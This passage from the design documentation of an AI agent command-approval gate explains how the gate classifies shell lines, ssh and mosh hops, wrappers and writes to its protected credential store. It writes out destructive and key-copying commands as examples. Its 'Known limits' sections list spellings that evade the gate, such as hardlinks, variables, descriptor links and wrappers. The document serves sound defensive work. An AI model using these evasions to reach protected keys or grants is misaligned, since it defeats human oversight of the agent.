`${PWD...}` forms; the text `eval` runs (it asks as `opaque_exec`); `cd -` and `OLDPWD`,
`CDPATH`, `HOME` set on the line and `shopt -s dotglob`; and a store reached through a folder
link whose name does not say so.

Compound commands (#161). The stdin of a compound command reaches the commands inside it, nested
compounds included: a heredoc or here-string after its closing `}`, `)`, `done`, `fi` or `esac`,
and text the gate can read piped into it (`echo ... | ( bash )`, `... | while read l; do bash; done`).
So `{ bash; } <<EOF`, `( bash ) <<EOF` and `while ...; do bash; done <<EOF` classify the body as
`bash <<EOF` does, and `{ python3; } <<EOF` reads it as code. `coproc W { bash; } <<EOF` and
`function f { bash; } <<EOF` are read the same way. As in bash, a command whose stdin is already
set keeps it and is not fed: one with its own heredoc, here-string or `<` redirection (`{ cat <<EOF;
bash; }` feeds cat only), one piped into from a command inside (`{ curl ... | bash; } <<< 'ls'`
stays `opaque_exec`), and the commands of a nested compound with its own closer redirection or pipe.
Nothing more is fed after a command that may make a file the shell's stdin for good: `exec` with its
own stdin however it is spelled or prefixed (`"exec"`, `\exec`, `command exec`, `X=1 exec`), and
`eval`, `source`, `.`, a program name from a variable or a function defined on the line, which can
run such an exec unseen. When the closer has its own `<`, nothing is fed (the gate keeps no order
between a closer's redirections, so it does not guess which one bash applies last: `{ bash; } <<EOF
< f`), and a closer heredoc or here-string wins over a pipe in. That holds for stdin (fd 0). Heredocs
keep no fd number, so a closer heredoc on another fd (`{ bash; } 3<<EOF`), where bash leaves
stdin alone, is read as stdin too: its body is fed (code inside can still run it, as `{ source
/dev/fd/3; }` does), and text piped in reaches only the first command inside, as in any `echo ... |
bash`. So `echo 'rm -rf build' | { bash; } 3<<EOF` is a `delete` whichever text bash runs, but in
`echo 'rm -rf build' | { true; bash; } 3<<EOF` bash, which reads the pipe there, is read with the
body only. A shell read that way still asks at least, as `bash 3<<EOF` does (main asks for these
lines too). Outside these cases, every command inside gets all of the compound's stdin. That
over-approximates, and the fed text can change the line's category and the summary shown when it
asks: shells, interpreters, gh and SQL clients act on it, so `{ cat; } <<EOF` stays `read`, while
`{ bash; }
<<EOF` with `rm -rf build` in the body is `delete`. Each text is read once per line, however many
commands it reaches, and so is a body after `<<$'EOF'`, which is also read as commands, and the
stdin of a `sqlite3`, `psql` or `mysql` client. Every command it reaches still counts what that
reading found, so a later client whose argument is a store folder is still a `store_write` when the
text deletes. For fed shells and interpreters, a line that was `opaque_exec` now takes the inner
category. The floor above keeps it at ask at least under a policy that names `opaque_exec` at `ask`
or `deny`. A `deny: [opaque_exec]` entry still denies these shell and interpreter lines, since the
shell or interpreter inside is an `opaque_exec` part (D-075), and since #191 so do
`categories: {opaque_exec: deny}` and a rule that denies `opaque_exec`. Fed SQL clients follow
their plain-input classification, without that floor. A compound feeding `\! git push origin main`
to `psql` can therefore change from ask to the push's `log`. D-075 `deny` and `reserved` entries
still match every retained part, and a category line or rule that denies a part denies the line
(#191); other category lines and rules use the combined classification. Likewise a line whose later
command takes a store folder is `store_write`, which outranks `delete` (D-038):
`deny: [delete]` still denies it through its delete part (D-075), and so does `categories:
{delete: deny}` (#191). Known limits:
the body of `time {
...; }` is not read at all (`{` is an unknown program there), so a heredoc after it changes nothing;
it asks as `opaque_exec`. As on main, text piped into a command is read even when the command's own
`<` wins (`echo ... | bash < f`), and so is the pipe into the first command of `echo ... | { bash; }
< f`.

Known limits: the paths where a `deny` entry still becomes an `ask`, or where the line is
`allow` outright, are listed once, under "Known limits" above.

Since #164, an `ssh` or `mosh` chain with more hops than the gate reads asks (#153), and the
command-valued options of allowlisted programs (`tar --to-command`, `split --filter`, `rsync -e`,
`ssh -o ProxyCommand=...`, `less '+!...'`, `PAGER=` and the rest; #154) are read, so a `deny`
entry on what they run applies. `git -c core.pager=...` and the other command-running git config
keys already ask.

`ssh` options are read as getopt reads them: in a cluster such as `-vp 22`, the first letter
that takes a value ends the word, and the value is the rest of the word or the next word. Before,
the gate took the value of `-B`, `-P`, `-I` or of a cluster ending in a value letter for the host
and the host for the program, so `ssh -vp 22 host rm -rf /data` was `allow` even under `deny:
[delete]`. Now the inner command is read, and a line written that way also asks, because a few
such lines used to ask on the program the gate misread. Wherever the gate now reads another word
as the host than it used to, the line asks and the parts of both readings are matched. A `--`
right after the host ends `ssh`'s options, and the command after it is read (`ssh host -- rm -rf
/data`).

With no remote command, `ssh host` starts the login shell on the host, and that shell runs what
ssh's stdin carries (#240). When the line gives ssh a stdin (a pipe, a heredoc, a here-string, or
a `<` from anything but `/dev/null`), the gate reads that text as shell, as it reads `bash -s`:
the line asks as `opaque_exec` at least, and each command in the text is a part, `internal` like
the rest of the line. So `echo 'rm -rf /data' | ssh prod-db`, and `ssh prod-db <<'EOF'` with
`rm -rf /data` in the body, deny under `deny: [delete]`, and text the gate cannot read (`ssh host
< script.sh`, `generate | ssh host`) asks. As for `ssh host 'rm -rf /data'`, the most severe
command in the text sets the line's category and target. `deny` and `reserved` entries see every
part, so a `target:<host>` entry still matches through the hop part, and since #191 so does a
category setting or rule that denies the hop (`categories: {shell: deny}`, a rule keyed on the host
as `target`): these lines are denied as on main. ssh reads options after the host too, up to the
remote command, so `ssh host -T` and `ssh host --` have no command, and an empty word (`ssh host
''`) is none either. `-n`, `-N` and `-f` keep ssh from running its stdin, and a remote command
takes the stdin as its own input; those lines keep their reading. A word that may expand to no
word or several among the options and the host, or as every word of the command (`ssh $OPTS
host`, `ssh "$HOST"`, `ssh host $CMD`), leaves them uncountable, as for the option reader above,
so the stdin is read then too (`echo data | ssh "$HOST" 'cat > f'` asks). Known limits: the `-o`
forms of those three flags (`StdinNull`, `SessionType=none`, `ForkAfterAuthentication`) are not
honored, so such a line reads its stdin anyway; text fed to a remote shell (`ssh host bash -s
<<EOF`) is not read yet, and the line asks as `opaque_exec` as before; a stdin set earlier by
`exec < file` (`exec < f; ssh host`) is not seen. `mosh` lines are unchanged.

`mosh` reads its options with Perl's Getopt::Long in its default mode, and the gate reads them the
same way, against mosh's own option list: `--`, `-` or `+` before the name, any case, a unique
prefix of the name (`--serv`, `-ssh`, `--SERVER`), the value after `=` or in the next word, and
options after the host (`mosh host --server=...`). `--` ends the options, so the command after
`mosh host --` is read. The short options are mosh's, not ssh's: `-a`, `-n`, `-4`, `-6`, `-p
PORT`, `-o` (`--predict-overwrite`, which takes no value) and `-l` (a prefix of `--local`). A word
that names no single option (`--s`, which could be `--server`, `--ssh` or `--ssh-pty`;
`--local=1`; an unknown name) stops mosh, and the line asks; the words after it, and the word
itself once a host is read, are read as the host and command. The value of `mosh --ssh`,
`--client` or `--server` is a command that runs, so the gate reads it as one: `mosh --serv='rm -rf
/data' host` denies under `deny: [delete]`, and any such line asks. The `--ssh` and `--client`
helpers run on this machine, so they keep their own exposure; `--server` runs on the remote host
and is `internal` like the inner command. With `--local`, mosh runs the server and the command on
this machine, so nothing on the line is marked `internal`. Another option's value that itself
reads as `--server`, `--ssh` or `--client` (`mosh --port '--server=rm -rf /data' host`) is taken
by mosh as that value and never run, but the gate used to read it as the command, so it still
does and the line asks. Words after the host that mosh takes as its options or their values
(`mosh host ls --port 'x; rm -rf /data'`) are read both ways: with `POSIXLY_CORRECT` set,
Getopt::Long stops at the host and mosh runs them as the command, so their parts are matched as
that command too and the line asks. The same holds where the gate used to read another word as the
host. A `--` right after the host needs no second reading (`mosh host -- rm -rf /data` denies under
`deny: [delete]`).
Known limit. The gate does not model a variable's value. Bash evaluates a bare name in an
arithmetic context as arithmetic too (`a[i]`, `$(( x ))`, `declare -i`), so a value such as
`b[$(cmd)]` set earlier runs cmd there. Only an expansion written in the name argument of the
builtins above asks; one in an assignment word (`a[$i]=v`) or an arithmetic expression
(`$(( a[$i] ))`) does not. The gate cannot tell an associative array from an indexed one, so a
subscript of an associative array asks too, although bash does not evaluate it as arithmetic.
Only a value written in the `declare` operand itself is read (#188): a later plain assignment
to a `-i` or `-n` variable (`declare -i n; n='a[$(cmd)]'`), an element of an unquoted compound
value given with `-i` (`declare -ai b=($x)`) and a compound value or name that comes whole
from a variable (`declare -a b=$x`, `declare "$n=$v"`) are evaluated by bash too and are not
read.
Known limit (#160). Some wrapper forms are not read and ask as `opaque_exec`, as they did before:
BSD and macOS `script -q FILE CMD`, `screen -R` and `-RR` (they start the command when no session
is detached), `su -c`, `runuser`, `sg`, `pkexec`, `faketime`, `bwrap`, `fakeroot`, `strace`,
`prlimit`, `systemd-nspawn`, `ip netns exec`, tmux's `if-shell`, `pipe-pane` and `display-popup`,
a tmux command name cut short (`new-w`) and an alias set in a tmux config file. Two are read but
not fully: `systemd-run --on-calendar` (and its other timer options) is read as running its
command, not as `schedule`, and `parallel -S` carries no remote-host signal. Both still ask.
A wrapped line whose inner command outranks `opaque_exec` (a wrapped env dump is `credentials`, a
wrapped push is `vcs_push`) takes that inner category, but the wrapper stays an `opaque_exec` part,
so a `deny: [opaque_exec]` entry (D-075), a `categories: {opaque_exec: deny}` line or a rule that
denies `opaque_exec` (#191) denies the line.

The gate reads the common ways a line sets a variable. A shell's rarer expansion forms can still
set one unseen: an unquoted here-doc body fed to a builtin (`${NAME:=v}` or `$((NAME=n))` in
it), a brace expansion in a name (`export {PATH,FOO}=x`), indirect expansion (`${!ref:=v}`),
arithmetic in a substring offset (`${x:PATH=1}`), the old `$[...]` arithmetic, an integer
variable (`declare -i x; x=PATH=5`), `wait -p NAME` and `{NAME}<<<x`. This is one more reason
the sandbox is the real fix.

## The store is credentials (D-038)

The gate's own inputs are on the protected list (`is_store_path`): `policies/`, `state/`
(including `approval-grants.json`), `ledger.sqlite*` and `keys/` of the principal store and of
`$EXO_HOME`, `$EXO_HOME/run` (the core and agent sockets), `$EXO_HOME/seats` and `$EXO_HOME/bus`
(the bus registry that signed seat answers and the relay trust, the relay database and its
`-wal`, `-shm` and `-journal` files, #210), `$EXO_HOME/update` (`allowed_signers`, the
signed-update trust pin of D-073, #133), any `seat.toml`, `$EXO_PRINCIPAL_STORE`, and every store
root recorded in config `principals` (`exo init --root`, `exo import-store --root`), for every id,
not only the active one. When the environment moves a bus file, the gate protects where it points:
the files `EXO_BUS_REGISTRY` and `EXO_BUS_DB` name (with the database's sidecars) and the folder
`EXO_BUS_KEYS_DIR` names, each also by its legacy `DIVAN_` name, and both spellings when both are
set. Distinctive names match anywhere, so a relative `policies/gates.yaml`,
`state/approval-grants.json`, `bus/registry.json`, `bus/relay.sqlite` or `update/allowed_signers`
counts too, and `.exo/bus` and `.exo/update` count whatever `EXO_HOME` is. A project folder called
`update` is ordinary; only a file in it named `allowed_signers` asks. `config.json` is not on the
list yet (D-074, #125).

Absolute paths are checked in both their lexical form and their resolved symlink form, including
missing final components, and so is the target of `cd`, `pushd` and `git -C`. This catches file and
directory aliases into protected stores, aliases used to delete a store or its ancestors, a `cd` into
an alias of the store, and `//` or `/proc/self/root` spellings. Resolution preserves `symlink/..`
filesystem order. Lexical protection still applies when a protected path links outside the store. A
path that cannot be resolved (a NUL byte) keeps its lexical check, so the floor never depends on
resolution working. `cp -s` and `cp -l` (also spelled `--sym` or `--li`) count as writes to whatever
they alias. A relative `ln` target is read against each folder the link can land in: `-t DIR`
(also `-tDIR`, `-st DIR` and `--target-directory`; only the last, as `ln` rejects two), the last
operand in case it is an existing folder, and that operand's parent. Options count anywhere on the
line (`ln REL LINK -s`), because getopt permutes them. A folder given as a relative path is not a
base: relative paths only use the distinctive-name checks, because the tool's working directory is
unknown here.

Brace sets are expanded first, as bash does and as for secret-store paths (issue #224). A shell word is
expanded from its source text, so only unquoted braces expand. A file tool's path is expanded as written. The
word and every word it expands to are checked, and a hit on any counts, so
`echo x > ~/.exo/polic{i..i}es/default.yaml`, `cp x ~/.exo/{state,zz}/approval-grants.json` and
`cd ~/.e{x,}o` reach the store. A word is split at `=`, `:` and `,` only after its braces expand, so
`dd of=~/.exo/polic{i,x}es/default.yaml` counts too. A word past the brace limits counts as the store. The store
checks have their own budget of 4,096 expanded words per tool call, so they never use up the secret-store
checks' budget, and each spelling is expanded once per line, however many commands use it.

Known limits. These are classification checks, not a filesystem sandbox: a symlink can change
between classification and execution (TOCTOU). A hardlink made earlier (`cp -al`) shares the file
without a link to resolve, so only distinctive names catch a write through it. Only the store roots
are resolved: when a protected entry itself links out of the store (`policies -> ~/dotfiles/x`), a
write to the outside spelling is a local write. A copy or an archive unpacked into the home folder
itself, which makes a protected folder from its source name (`cp -r /tmp/x/update ~/.exo/`,
`tar -C ~/.exo -xf x.tar`), is not seen either. Nor is a path held in a variable or made by a
command (`F=~/.exo/state/gate-grants.json; cp x "$F"`,
`cp x ~/.exo/$(echo state)/gate-grants.json`). Name and prefix checks are case-sensitive, so a
case-insensitive filesystem (APFS) accepts `STATE/` for `state/`. A glob spelling
(`sta*/gate-grants.json`) is expanded by the shell, not seen here. A link planted
and used through relative paths in one command (`cd ~ && ln -s .exo e && cd e && ...`) is not
followed, and the bash tool's `cwd` argument is not read here (the secret-store checks read it, #209).
A copy or archive of `keys/` that the gate reads only as a key read has no store write part, so a
seat that `approvals.yaml` delegates `credentials` to may still answer it, as before #447. It asks
every time, and no grant covers it: `tar czf /tmp/k.tgz -C ~/.exo keys`,
`tar cf - -C ~/.exo keys | ...`, `cat < ~/.exo/keys/seat.key > /tmp/k` and
`cat ~/.exo/keys/seat.key | tee /tmp/k`.

Descriptor paths (#217). `/dev/fd/N`, `/dev/stdin`, `/proc/<pid>/fd/N`, `/proc/<pid>/cwd`,
`/proc/<pid>/root` and `/proc/<pid>/map_files` (`<pid>` also `self`, `thread-self` or `$$`, with or
without `task/<tid>/`) name whatever the writing process holds there, which the gate cannot resolve
from its own process. On Linux a write through one reopens that file for writing, so
`exec 3< ~/.exo/state/gate-grants.json; printf X > /dev/fd/3` rewrote the grants. A write to such a
path or below it is a `store_write`, however it is spelt: a redirection, `tee`, `cp`, `dd of=`, a link
to it (`ln -s /proc/self/fd/3 x`), a file tool's path, `//dev/fd/3`, `/dev/fd/$fd`, or a relative
`dev/fd/3` (after `cd /`). So is a writing command after a `cd` into one, or into `/dev`, `/proc`,
`/proc/<pid>` or `/proc/<pid>/task/<tid>` (`cd /dev && printf x > fd/3`). The writer's own stdout and
stderr stay ordinary (`> /dev/fd/1`, `> /proc/self/fd/2`, `> /dev/stdout`). A store path opened for
reading on a descriptor other than stdin (`3< f`, `exec 2< f`, `{ ...; } 1< f`) is a `store_write`
too, because `> /dev/fd/3` or `> /dev/stdout` later on the line, or in a later call of a persistent
shell, writes it back. On stdout or stderr, where the write back is an ordinary write, any target the
gate cannot pin to a path counts as well: a variable (`1< "$f"`), a substitution, a glob
(`2< ~/.exo/sta*/gate-grants.json`) or a relative name (`exec 1< gate-grants.json`). `cat < f`,
`cat 0< f`, `exec 3< "$f"` and `exec 2< /dev/null` stay reads.

Known limits. A descriptor path is matched as written, not resolved (the gate's own realpath would run
through its own descriptors). A link to one, or to `/dev` or `/proc/self`, is a store write when a shell
line makes it (`ln -s /dev x`), as is code that names a descriptor path, but one made where the gate
does not see it (code linking to `/dev` is `code`, which policy may lower), or already there, is
followed by nothing: a store file opened on descriptor 3 or above through a spelling the gate cannot
read (a variable, a glob in a folder part, a named `{fd}`) and written back through that link passes
(`exec 3< "$f"; printf X > /tmp/link-to-dev/fd/3`). So does a store file reached through a hardlink and
opened on stdout (`exec 1< /tmp/hardlink; printf X > /dev/stdout`), as for any hardlink above. Both are
tracked in #324. Known friction (fails closed, no grant): a descriptor path used as an input of a command that
writes asks too, since the words of a writing command are not told apart (`jq . /dev/stdin > out.json`,
`cat /dev/stdin > f`, `patch -i /dev/stdin`, `diff /proc/self/fd/3 x > out`); `jq . < /dev/stdin >
out.json` does not. So does a post whose body file is a descriptor path written out
(`gh pr comment 5 --body-file /dev/stdin`): it is this store write, which only the principal answers, never
granted, rather than the unseen-body ask of a post (#208), which a seat may answer; its card says the
path is one the gate cannot resolve, not that the command writes it. A body file that only links to one
(`--body-file notes.md`, a link to `/dev/stdin`) keeps the unseen-body ask.

Any write is `store_write`: `write_file`, `edit_file`, `patch`, `apply_patch`, a redirection, a
non-read program with a store path argument (`rm`, `mv`, `cp`, `tee`, `sed -i`, `chmod`,
`sqlite3`, `touch`, `ln`), a connection to the socket (`nc -U`, `curl --unix-socket`, `socat`),
`exo log append`, `exo keygen`, `exo init`, `exo update --pin-trust` (#133), `git -C <store>` with a
writing subcommand, and any writing command after `cd` into the store. `rm -rf ~/.exo` counts (an ancestor). A
`store_write` always asks, no policy lowers it, no standing grant covers it, and only the
principal may answer (`PRINCIPAL_ONLY`, whatever `approvals.yaml` says). It is enforced in
observe mode too. When the decision fails on a call the gate reads as a store write or secret (a
policy pattern that does not compile, for example), the hook's fallback card still asks the
principal alone, once, in observe mode too (#464). A store write or secret part counts, as on the
normal path (#447). Other calls keep their fallback: a read tool
runs, observe mode runs the call, and enforce mode asks (#466). Reads of the store stay `read`, except `keys/` and the run folder's secrets
(see "Who answered" above), which are `credentials`. A secret wins over the store rule: a write
or delete that touches `keys/` or a run-folder secret (`rm -rf ~/.exo/keys`, `rm -rf ~/.exo/run`,
`rm ~/.exo/run/*`, `mv ~/.exo/run/* /tmp/`) is `credentials`. That covers moving or replacing
the folder that holds the core sockets too: `mv ~/.exo/run ~/.exo/run.old`,
`mv /tmp/x ~/.exo/run`, `ln -sfn /tmp/x ~/.exo/run`, `cp -rT /tmp/x ~/.exo/run`,
`mkdir -p ~/.exo/run` and `chmod 777 ~/.exo/run` are `credentials`, not `store_write` (#169). It
still always asks and is never granted. Its store write part keeps the answer with the principal
alone, whatever `approvals.yaml` delegates (#447, "Who may approve"). Before #447 a seat that
`approvals.yaml` delegates `credentials` to (or a seat in `default:` with no `credentials:` line)
could answer it. A copy or archive of `keys/` that the gate reads as a write
(`cp ~/.exo/keys/seat.key /tmp/k`, `cat ~/.exo/keys/seat.key > /tmp/k`, `tar czf - ~/.exo/keys`)
has a store write part too, so it is the principal's alone. Some spellings read only as a key read
and keep the delegation (see "Known limits" above). A file tool's write, move, copy or delete there
(`write_file` or `delete_file` on `~/.exo/keys/seat.key`) is `credentials` with a store write part
as well, so it is the principal's alone too. A read alone (`cat ~/.exo/keys/seat.key`, `read_file`
on it) has none, so such a seat may answer it. A delete of job output only (`rm ~/.exo/run/jobs/1.log`) or of a socket by name
(`rm ~/.exo/run/exod.sock`) stays `store_write`.

What the floor does to a policy's denies. A shell write to the store keeps its own reading
(`local_write`, `shell`, `delete`) as a part beside the store part, so a deny on that category
still denies the line (D-075, #191), and so does a matrix cell that denies the part (#464):
`ssh host 'rm -rf ~/.exo/update'` is denied under `matrix: {irreversible: {internal: deny}}`, as
it was before #133. A file tool's write or delete (`write_file`, `edit_file`, `patch`,
`apply_patch`, `create_directory`, `move_file`, a delete tool) is `store_write` and keeps the
tool's own reading as a part (#448): a `local_write` part for each file a write tool writes, or
the tool's own category (`delete`). So a `local_write` or `delete` deny, a `reserved:` entry, a
`target:` entry on another file the patch writes and a matrix cell on it still apply. A file tool on a secret store keeps its reading beside `credentials` the
same way (`read_file ~/.ssh/id_rsa` is denied under `deny: [read]`, as `cat ~/.ssh/id_rsa` is).
When such a tool also writes, moves, copies or deletes store files, each one is a `store_write`
part (#447), and so is a folder holding the store that it moves, renames or deletes. So a
`store_write` deny or `reserved:` entry, or a `target:` entry on any of those files, applies:
`move_file` from `~/.ssh/id_rsa` to `~/.exo/policies/gates.yaml` is denied under
`deny: [store_write]`, and `copy_file` from `~/.exo/keys/seat.key` to `~/.exo/policies/gates.yaml`
under `deny: ["target:*/.exo/policies/*"]`, where they asked before.
After `cd /dev` or `cd /proc/self/fd`, a line naming a store path (`printf x > update/allowed_signers`)
has that path as its target, and the descriptor folder is a second store-write part (#464), so a
`target:/dev*` or `target:/proc*` deny still denies it. On a store-write line, a relative key read after `tar -C` into
a store (`tar -C ~/.exo/policies -czf - ../keys/seat`) is a `credentials` part, so a deny or
reserved entry on `credentials` sees it. Its target is the name as written (`../keys/seat`), as for
`tar -C ~/.exo -czf - keys/seat`. In each case the line stays `store_write` and asks the
principal alone when nothing denies it. `exo update --pin-trust` keeps its old
`opaque_exec` reading as a part, so a deny on `opaque_exec` still denies it, and naming
`opaque_exec` at `allow` or `log` no longer lets it run without an ask.

## Policy changes during a session (D-038)

The plugin pins the policy it loaded first. When a policy file (or a scrub source) changes
later, it loads the new one, writes a `policy_change` ledger row with the files' hashes, and
decides each call under both. The stricter outcome wins. So a change can tighten at once and
can never loosen until the principal runs `/gate accept` (ledger row `policy_accept`), or the
core restarts. `/gate` says whether a change is waiting.

The same holds for `approvals.yaml` (#211). An ask lists only the approvers both files allow, in
the pinned order (`gate.strictest_approvers`, an ordered intersection; the principal is first in
both, so the list is never empty), and an "always" answer lasts the shorter of the pinned and
changed `always` values, so a 0 in either writes no grant. A seat the principal removes cannot
answer the next ask; a seat they add waits for `/gate accept`. A changed file that does not load
counts as the defaults: the principal alone, 30 and 7 days. Limits: an ask already open keeps the
approvers it was sent with, and grants written before the change still match until they expire or
`/grants revoke` removes them.

## Principal authority for policy and settings changes

`/gate accept` requires the live principal caller stamped by the transport. The check lives in the
policy adoption method, so command aliases, whitespace and direct plugin calls cannot bypass it.
An unstamped call is refused before reading changed policy files or recording acceptance. The ledger
records the authenticated caller, including its client label. `/gate status` stays available locally.

`config.set` and `models.set` also require principal authority. The web default-model route returns
403 when the core refuses authority. It does not rewrite config through its offline fallback.
TCP and stdio callers remain local even when they possess a transport bearer token.

Two other body fields cannot claim the principal. `peers send` with `via="human"` from a non-principal caller
goes out as `via="agent"`, so the receiving daemon gives it `same-principal` trust, not `principal`. `unsteer`
from a non-principal caller can pull back only steers that the principal did not write.
